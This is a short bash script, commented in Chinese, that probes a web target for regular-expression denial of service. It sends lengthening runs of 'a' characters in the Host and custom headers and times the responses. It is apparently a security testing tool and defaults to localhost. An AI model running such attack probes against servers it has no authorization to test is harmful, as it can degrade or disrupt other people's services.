#!/bin/bash
# ReDoS (正则表达式拒绝服务) 测试脚本

TARGET="${1:-http://localhost:8080}"
echo "Testing ReDoS against: $TARGET"

# 恶意正则表达式测试
# 这些正则表达式可能导致指数级回溯

# 测试 1: (a+)+ 模式
echo "=== Testing (a+)+ pattern ==="
for i in {10..30}; do
    payload=$(python3 -c "print('a' * $i)")
    echo "Testing with $i 'a' characters..."
    time curl -s -X GET "$TARGET" \
      -H "Host: ${payload}" \
      -o /dev/null -w "%{http_code}\n"
done

# 测试 2: (a*)* 模式
echo "=== Testing (a*)* pattern ==="
for i in {10..30}; do
    payload=$(python3 -c "print('a' * $i)")
    echo "Testing with $i 'a' characters..."
    time curl -s -X GET "$TARGET/api/rawdata" \
      -H "X-Custom-Header: ${payload}" \
      -o /dev/null -w "%{http_code}\n"
done

# 测试 3: 复杂正则表达式
echo "=== Testing Complex Regex ==="
malicious_input="aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
curl -X GET "$TARGET" \
  -H "Host: ${malicious_input}" \
  -v


